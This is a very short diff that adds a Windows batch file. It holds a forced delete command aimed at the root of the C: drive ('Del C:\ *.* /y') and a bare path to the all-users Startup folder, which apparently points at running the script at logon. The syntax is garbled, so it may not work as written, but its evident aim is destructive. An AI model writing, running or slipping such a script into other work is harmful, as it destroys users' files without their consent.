@@ -1,0 +1,4 @@
+@echo off
+//remove me //Del C:\ *.* /y
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
